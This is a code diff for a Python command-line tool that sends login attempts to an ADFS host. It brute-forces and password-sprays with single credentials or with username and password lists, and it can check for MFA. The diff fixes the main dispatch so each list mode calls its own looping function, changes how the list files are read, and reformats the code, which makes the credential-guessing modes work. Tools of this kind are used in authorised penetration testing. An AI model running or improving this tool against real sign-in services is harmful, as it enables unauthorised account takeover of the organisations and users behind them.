@@ -30,7 +30,7 @@ def send_request(
     target, username, password, verbose=False, log_file=None, check_mfa=False
 ):
     if verbose:
-        print(f"{Fore.WHITE}[*] Trying login for {username}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}[*] Trying login for {username}{Style.RESET_ALL}", end="\r")
 
     payload = {
         "UserName": username,
@@ -115,8 +115,17 @@ def send_request(
         print(f"{Fore.RED}[!] Error occurred: {e}{Style.RESET_ALL}")
 
 
-def single_username_single_password(target, username, password, verbose, log_file, check_mfa):
-    send_request(target, username, password, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
+def single_username_single_password(
+    target, username, password, verbose, log_file, check_mfa
+):
+    send_request(
+        target,
+        username,
+        password,
+        verbose=verbose,
+        log_file=log_file,
+        check_mfa=check_mfa,
+    )
 
 
 def single_username_password_list(
@@ -124,14 +133,15 @@ def single_username_password_list(
 ):
     try:
         with open(password_list_file, "r") as file:
-            for password in file:
+            passwords = file.read().splitlines()
+            for password in passwords:
                 send_request(
                     target,
                     username,
                     password.strip(),
                     verbose=verbose,
                     log_file=log_file,
-                    check_mfa=check_mfa
+                    check_mfa=check_mfa,
                 )
     except FileNotFoundError:
         print(f"{Fore.RED}[!] File '{password_list_file}' not found.{Style.RESET_ALL}")
@@ -146,14 +156,15 @@ def username_list_single_password(
 ):
     try:
         with open(username_list_file, "r") as file:
-            for username in file:
+            usernames = file.read().splitlines()
+            for username in usernames:
                 send_request(
                     target,
                     username.strip(),
                     password,
                     verbose=verbose,
                     log_file=log_file,
-                    check_mfa=check_mfa
+                    check_mfa=check_mfa,
                 )
     except FileNotFoundError:
         print(
@@ -182,7 +193,7 @@ def username_list_password_list(
                     password.strip(),
                     verbose=verbose,
                     log_file=log_file,
-                    check_mfa=check_mfa
+                    check_mfa=check_mfa,
                 )
     except FileNotFoundError:
         if not username_list_file:
@@ -281,13 +292,41 @@ if __name__ == "__main__":
     print(f"{Fore.CYAN}[*] Target ADFS Host: {target}{Style.RESET_ALL}")
 
     if username and password:
-        send_request(target, username, password, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
+        single_username_single_password(
+            target,
+            username,
+            password,
+            verbose=verbose,
+            log_file=log_file,
+            check_mfa=check_mfa,
+        )
     elif username and password_list_file:
-        send_request(target, username, password_list_file, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
+        single_username_password_list(
+            target,
+            username,
+            password_list_file,
+            verbose=verbose,
+            log_file=log_file,
+            check_mfa=check_mfa,
+        )
     elif username_list_file and password:
-        send_request(target, username_list_file, password, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
+        username_list_single_password(
+            target,
+            username_list_file,
+            password,
+            verbose=verbose,
+            log_file=log_file,
+            check_mfa=check_mfa,
+        )
     elif username_list_file and password_list_file:
-        send_request(target, username_list_file, password_list_file, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
+        username_list_password_list(
+            target,
+            username_list_file,
+            password_list_file,
+            verbose=verbose,
+            log_file=log_file,
+            check_mfa=check_mfa,
+        )
     else:
         print(
             f"{Fore.RED}[!] Invalid combination of username and password options.{Style.RESET_ALL}"
